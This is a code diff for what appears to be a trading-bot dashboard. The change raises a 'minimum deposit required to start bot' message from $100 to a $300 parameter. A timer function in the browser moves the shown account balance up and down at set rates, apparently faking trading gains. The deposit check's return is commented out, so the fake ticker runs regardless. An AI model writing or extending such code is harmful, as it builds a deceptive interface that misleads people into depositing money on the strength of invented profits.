@@ -427,14 +427,14 @@
 	displayTransactions();
 
 	// BALANCE FLUCTUATION
-	function startBalanceFluctuation(rate, time, up, down) {
+	function startBalanceFluctuation(price, rate, time, up, down) {
 		document.querySelectorAll('.balance').forEach(realAcc => realAcc.textContent = savedInfo.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
 		// Try to get stored balance from localStorage
 		currentBalance = savedInfo.balance;
 		let balanceInterval;
-		if (currentBalance < 100) {
-		    toast('Minimum deposit of $100 required to start bot');
-		//return;
+		if (currentBalance < price) {
+		    toast(`Minimum deposit of $${price} required to start bot`);
+			//return;
 		}
 		// Clear any existing interval
 		if (balanceInterval) {
@@ -461,7 +461,7 @@
 			document.querySelectorAll('.balance').forEach(realAcc => realAcc.textContent = `${currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`);
 		}, time); // Update every second
 	}
-	startBalanceFluctuation(0.4, 1000, 0.6, 0.1);
+	startBalanceFluctuation(300, 0.4, 1000, 0.6, 0.1);
 	
 	// DISPLAY USER INFO
 	const fullName = savedInfo.name
